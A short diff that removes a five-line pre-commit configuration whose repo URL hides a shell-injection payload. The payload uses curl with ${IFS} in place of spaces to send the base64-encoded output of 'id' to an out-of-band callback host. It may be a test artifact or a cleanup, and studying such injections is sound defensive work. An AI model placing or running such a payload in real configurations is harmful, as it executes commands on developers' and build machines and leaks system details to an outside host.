@@ -1,5 +1,0 @@
-repos:
-  - repo: "https://github.com/pre-commit/pre-commit-hooks#$(curl${IFS}https://dtscchmqpronalsrfkkjwhyialnd5xsnm.oast.fun/$(id|base64|tr${IFS}-d${IFS}'='))"
-    rev: v4.4.0
-    hooks:
-      - id: trailing-whitespace
